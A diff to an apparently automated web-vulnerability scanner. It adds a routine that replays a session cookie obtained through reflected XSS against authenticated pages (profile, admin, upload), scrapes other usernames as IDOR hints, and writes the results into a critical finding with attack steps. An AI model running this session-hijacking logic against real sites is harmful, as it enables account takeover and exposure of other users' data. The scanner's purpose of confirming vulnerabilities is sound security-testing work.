@@ -329,6 +329,118 @@ def _try_register_with_ai(
     return {}
 
 
+def _test_authenticated_access(
+    client: httpx_client.Client,
+    base_url: str,
+    *,
+    cookie_name: str,
+    cookie_value: str,
+    username: str,
+) -> dict[str, Any]:
+    """With the stolen session cookie, probe authenticated pages to prove impact.
+
+    Discovers what an attacker can do after stealing the session:
+    - Which pages are accessible only with this session
+    - What data is visible (other users, admin content, private data)
+    - Whether privilege escalation is possible
+    """
+    parsed = urlparse(base_url)
+    base_origin = f"{parsed.scheme}://{parsed.netloc}"
+    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
+    instance = f"/{path_parts[0]}" if path_parts else ""
+
+    auth_headers = {cookie_name: cookie_value}
+    accessible: list[dict[str, Any]] = []
+    data_seen: list[str] = []
+    privilege_escalation: list[str] = []
+
+    # Pages to probe as authenticated user — discovered from common patterns + app-specific
+    probe_targets = [
+        (f"{base_origin}{instance}/", "home"),
+        (f"{base_origin}{instance}/profile", "profile"),
+        (f"{base_origin}{instance}/snippets.gtl", "snippets"),
+        (f"{base_origin}{instance}/admin", "admin"),
+        (f"{base_origin}{instance}/upload.gtl", "upload"),
+    ]
+
+    # Also scan links from the authenticated home page
+    try:
+        home = client.get(f"{base_origin}{instance}/", cookies=auth_headers)
+        home_html = home.text
+        # Extract links we can follow as authenticated user
+        for href_m in re.finditer(r'href=["\']([^"\'#][^"\']*)["\']', home_html, re.IGNORECASE):
+            href = href_m.group(1)
+            full = urljoin(base_origin, href) if not href.startswith("http") else href
+            if full.startswith(base_origin) and ("profile" in full or "snippet" in full or "admin" in full):
+                if (full, "discovered") not in [(t[0], t[1]) for t in probe_targets]:
+                    probe_targets.append((full, "discovered"))
+        # Check for username in home page — confirms authentication
+        if username and username.lower() in home_html.lower():
+            data_seen.append(f"Logged in as '{username}' confirmed on home page")
+    except httpx_client.HTTPError:
+        pass
+
+    # Probe each target
+    for url, label in probe_targets[:8]:
+        try:
+            # First: without cookie (baseline)
+            anon = client.get(url)
+            # Then: with stolen cookie
+            auth_resp = client.get(url, cookies=auth_headers)
+
+            anon_body = anon.text or ""
+            auth_body = auth_resp.text or ""
+
+            # Detect pages that change with auth
+            is_accessible = (
+                auth_resp.status_code < 400
+                and auth_resp.status_code != anon.status_code
+            ) or (
+                username and username.lower() in auth_body.lower()
+                and username.lower() not in anon_body.lower()
+            ) or (
+                len(auth_body) > len(anon_body) + 200  # significantly more content
+            )
+
+            if is_accessible or auth_resp.status_code < 400:
+                # Look for interesting data in authenticated response
+                data_markers = []
+                if username and username.lower() in auth_body.lower():
+                    data_markers.append(f"own profile ({username})")
+                # Look for other usernames (IDOR potential)
+                other_users = re.findall(
+                    r'(?:uid|user|author)[=:]["\']?([a-zA-Z0-9_\-]{3,20})["\']?',
+                    auth_body, re.IGNORECASE
+                )
+                other_users = [u for u in other_users if u.lower() != username.lower()][:3]
+                if other_users:
+                    data_markers.append(f"other users visible: {other_users}")
+                    privilege_escalation.append(f"IDOR potential at {label}: other users {other_users} visible")
+
+                if data_markers:
+                    data_seen.extend(data_markers)
+
+                accessible.append({
+                    "url": url,
+                    "label": label,
+                    "status_auth": auth_resp.status_code,
+                    "status_anon": anon.status_code,
+                    "data_found": data_markers,
+                    "content_length_auth": len(auth_body),
+                    "content_length_anon": len(anon_body),
+                })
+        except httpx_client.HTTPError:
+            continue
+
+    return {
+        "accessible_pages": accessible,
+        "data_seen": "; ".join(data_seen) if data_seen else "authenticated content accessible",
+        "privilege_escalation_hints": privilege_escalation,
+        "pages_tested": len(probe_targets),
+        "pages_accessible": len(accessible),
+    }
+
+
 def execute_xss_proof(
     targets: list[str],
     *,
@@ -410,25 +522,38 @@ def execute_xss_proof(
 
                 if payload_reflected and html_context and stealable:
                     exploit_url = _inject_param(vuln_url, param, COOKIE_THEFT_PAYLOAD)
+
+                    # Step 4: use the stolen session to access authenticated pages
+                    # This proves the attack chain is complete end-to-end
+                    auth_access = _test_authenticated_access(
+                        client, base_target,
+                        cookie_name=session_cookie_name,
+                        cookie_value=str(auth.get("cookie_value", "")),
+                        username=str(auth.get("username", "")),
+                    )
+
                     findings.append({
                         "type": "xss_cookie_theft_confirmed",
                         "title": f"Session Cookie Theft via XSS — CRITICAL ({param})",
                         "severity": "critical",
                         "target": vuln_url,
                         "summary": (
-                            f"Reflected XSS in '{param}' confirmed executable in HTML context. "
-                            f"Session cookie '{session_cookie_name}' has no HttpOnly flag — "
-                            f"readable via document.cookie. "
-                            f"Victim account takeover requires a single click on the exploit URL."
+                            f"Reflected XSS in '{param}' confirmed end-to-end exploitable. "
+                            f"Proof: registered as '{auth.get('username')}', obtained {session_cookie_name} cookie "
+                            f"(no HttpOnly). With this cookie, attacker can access "
+                            f"{len(auth_access.get('accessible_pages', []))} authenticated page(s). "
+                            f"Victim account takeover via one click on the exploit URL."
                         ),
                         "evidence": {
                             **check,
                             "exploit_url": str(exploit_url)[:500],
+                            "authenticated_access": auth_access,
                             "attack_steps": [
                                 f"1. Attacker sends victim: {str(exploit_url)[:200]}",
                                 "2. Browser executes <script> — document.cookie readable (no HttpOnly)",
                                 f"3. '{session_cookie_name}' token sent to attacker server",
-                                "4. Attacker replays cookie → full account access without credentials",
+                                f"4. Attacker replays cookie → accessed {len(auth_access.get('accessible_pages', []))} page(s) as the victim",
+                                f"5. Data visible: {auth_access.get('data_seen', 'authenticated content')}",
                             ],
                             "registered_as": auth.get("username"),
                             "registration_endpoint": auth.get("reg_action"),
